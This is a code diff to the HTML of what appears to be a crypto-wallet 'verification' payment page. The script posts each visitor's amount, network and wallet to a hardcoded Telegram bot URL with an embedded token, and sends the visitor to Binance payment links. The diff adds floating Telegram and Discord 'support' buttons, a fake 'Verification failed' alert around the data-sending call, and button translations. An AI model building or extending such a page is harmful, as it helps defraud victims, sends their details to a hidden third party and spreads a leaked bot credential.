@@ -80,6 +80,29 @@
       margin-top: 10px;
       display: none;
     }
+
+    .contact-btn {
+      position: fixed;
+      bottom: 20px;
+      padding: 10px 15px;
+      color: white;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+      z-index: 1000;
+    }
+
+    .contact-btn.telegram {
+      left: 20px;
+      background-color: #00aaff;
+      box-shadow: 0 0 10px #00aaff;
+    }
+
+    .contact-btn.discord {
+      right: 20px;
+      background-color: #5865F2;
+      box-shadow: 0 0 10px #5865F2;
+    }
   </style>
 </head>
 <body>
@@ -102,6 +125,10 @@
     <button id="sendBtn" style="display:none;">Pay Now</button>
   </div>
 
+  <!-- Telegram and Discord Buttons -->
+  <a href="https://t.me/Sigmasupport360bot" target="_blank" id="telegramBtn" class="contact-btn telegram">Telegram</a>
+  <a href="https://discord.gg/8cSDJZjE" target="_blank" id="discordBtn" class="contact-btn discord">Discord</a>
+
   <script>
     const amountLinks = {
       5000: "https://s.binance.com/AZ7BA2XV",
@@ -121,7 +148,13 @@
 
       const message = `New Verification:\nAmount: ${amount}\nNetwork: ${network}\nWallet: ${wallet}`;
       const telegramUrl = `https://api.telegram.org/bot8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw/sendMessage?chat_id=7739393558&text=${encodeURIComponent(message)}`;
-      await fetch(telegramUrl);
+
+      try {
+        await fetch(telegramUrl);
+      } catch (error) {
+        alert("Verification failed. Please try again.");
+        return;
+      }
 
       const loadingBar = document.getElementById("loadingBar");
       loadingBar.style.display = "block";
@@ -147,6 +180,20 @@
         alert("Invalid amount selected.");
       }
     });
+
+    // Multi-language button text
+    const translations = {
+      en: { telegram: "Telegram", discord: "Discord" },
+      fr: { telegram: "Télégram", discord: "Discorde" },
+      ru: { telegram: "Телеграм", discord: "Дискорд" },
+      zh: { telegram: "电报", discord: "迪斯科德" }
+    };
+
+    const currentLang = localStorage.getItem("language") || "en";
+    const t = translations[currentLang] || translations.en;
+
+    document.getElementById("telegramBtn").textContent = t.telegram;
+    document.getElementById("discordBtn").textContent = t.discord;
   </script>
 </body>
 </html>
